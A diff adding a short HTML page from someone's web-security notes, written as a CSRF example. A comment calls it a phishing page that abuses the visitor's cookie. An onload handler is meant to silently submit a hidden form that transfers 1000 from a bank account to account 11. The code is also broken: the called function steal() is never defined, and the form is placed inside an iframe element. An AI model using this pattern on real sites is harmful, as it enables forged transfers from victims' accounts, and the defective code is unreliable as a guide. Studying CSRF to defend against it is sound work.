@@ -1,0 +1,28 @@
+<!--
+ * @Author: your name
+ * @Date: 2020-03-19 19:52:17
+ * @LastEditTime: 2020-03-19 19:52:34
+ * @LastEditors: Please set LastEditors
+ * @Description: In User Settings Edit
+ * @FilePath: \RW 笔记\web安全\csrf\例子.html
+ -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+//钓鱼网站，利用用户的cookie进行权限操作转账
+
+<body onload="steal()">
+  <iframe name="steal" display="none">
+    &emsp;&emsp; <form method="POST" name="transfer" &emsp;action="http://www.myBank.com/Transfer.php">
+      &emsp;&emsp;&emsp;&emsp; <input type="hidden" name="toBankId" value="11">
+      &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<input type="hidden" name="money" value="1000">
+      &emsp;&emsp;&emsp;&emsp;</form>
+    &emsp;&emsp;</iframe>
+</body>
+
+</html>
